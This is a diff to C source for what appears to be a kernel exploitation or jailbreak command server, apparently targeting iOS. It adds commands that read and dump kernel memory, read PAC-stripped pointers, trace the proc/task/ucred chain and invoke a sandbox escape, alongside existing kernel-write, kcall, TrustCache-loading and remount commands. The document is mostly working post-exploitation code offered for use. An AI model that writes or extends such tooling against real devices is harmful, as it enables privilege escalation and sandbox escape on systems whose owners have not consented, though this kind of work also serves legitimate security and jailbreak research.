@@ -16,6 +16,11 @@ extern void kwrite64(uint64_t addr, uint64_t val);
 extern void kwrite32(uint64_t addr, uint32_t val);
 extern uint64_t kread_ptr(uint64_t addr);
 extern uint32_t kread32(uint64_t addr);
+extern void kread_buf(uint64_t addr, void *buf, size_t len);
+extern bool escape_sandbox(void);
+extern uint64_t find_our_proc(void);
+extern uint64_t get_task_from_proc(uint64_t proc);
+extern uint64_t get_ucred_from_proc(uint64_t proc);
 
 static int parse_hex(const char *s, uint64_t *out) {
     *out = strtoull(s, NULL, 16);
@@ -44,8 +49,13 @@ static void handle_command(int fd, const char *cmd_line) {
             "Available commands:\n"
             "  r64 <addr>              Read 8 bytes from kernel address\n"
             "  r32 <addr>              Read 4 bytes from kernel address\n"
+            "  rptr <addr>             Read pointer (PAC-stripped)\n"
+            "  dump <addr> <nbytes>    Hex dump kernel memory\n"
             "  w64 <addr> <val>        Write 8 bytes to kernel address\n"
             "  w32 <addr> <val>        Write 4 bytes to kernel address\n"
+            "  uid                     Show current uid/euid/gid\n"
+            "  chain                   Show proc/task/ucred chain\n"
+            "  escape                  Sandbox escape\n"
             "  kcall <func> <a1..a8>   Call kernel function (if PAC bypass available)\n"
             "  tcload <path>           Load a TrustCache file\n"
             "  mount                   Remount /private/preboot as r/w\n"
@@ -64,6 +74,49 @@ static void handle_command(int fd, const char *cmd_line) {
         uint64_t addr; parse_hex(argv[1], &addr);
         uint32_t val = kread32(addr);
         snprintf(reply, sizeof(reply), "0x%llx: 0x%08x\n", addr, val);
+    }
+    else if (strcmp(argv[0], "rptr") == 0 && argc >= 2) {
+        uint64_t addr; parse_hex(argv[1], &addr);
+        uint64_t val = kread_ptr(addr);
+        snprintf(reply, sizeof(reply), "0x%llx: 0x%016llx\n", addr, val);
+    }
+    else if (strcmp(argv[0], "dump") == 0 && argc >= 3) {
+        uint64_t addr; parse_hex(argv[1], &addr);
+        uint64_t len = strtoull(argv[2], NULL, 0);
+        if (len > 4096) len = 4096;
+        uint8_t *buf = malloc(len);
+        kread_buf(addr, buf, len);
+        size_t off = 0;
+        int pos = 0;
+        pos += snprintf(reply + pos, sizeof(reply) - pos, "dump 0x%llx len 0x%llx\n", addr, len);
+        for (size_t i = 0; i < len && pos < (int)sizeof(reply) - 64; i++) {
+            if (i % 16 == 0) {
+                if (i) pos += snprintf(reply + pos, sizeof(reply) - pos, "\n");
+                pos += snprintf(reply + pos, sizeof(reply) - pos, "%04zx: ", i);
+            }
+            pos += snprintf(reply + pos, sizeof(reply) - pos, "%02x ", buf[i]);
+        }
+        pos += snprintf(reply + pos, sizeof(reply) - pos, "\n");
+        free(buf);
+    }
+    else if (strcmp(argv[0], "uid") == 0) {
+        snprintf(reply, sizeof(reply),
+            "uid=%d euid=%d gid=%d egid=%d\n", getuid(), geteuid(), getgid(), getegid());
+    }
+    else if (strcmp(argv[0], "chain") == 0) {
+        uint64_t proc = find_our_proc();
+        if (!proc) {
+            snprintf(reply, sizeof(reply), "chain: our proc NOT FOUND\n");
+        } else {
+            uint64_t task = get_task_from_proc(proc);
+            uint64_t ucred = get_ucred_from_proc(proc);
+            snprintf(reply, sizeof(reply),
+                "proc=0x%llx task=0x%llx ucred=0x%llx\n", proc, task, ucred);
+        }
+    }
+    else if (strcmp(argv[0], "escape") == 0) {
+        bool ok = escape_sandbox();
+        snprintf(reply, sizeof(reply), "escape: %s\n", ok ? "OK" : "FAILED");
     }
     else if (strcmp(argv[0], "w64") == 0 && argc >= 3) {
         uint64_t addr, val;
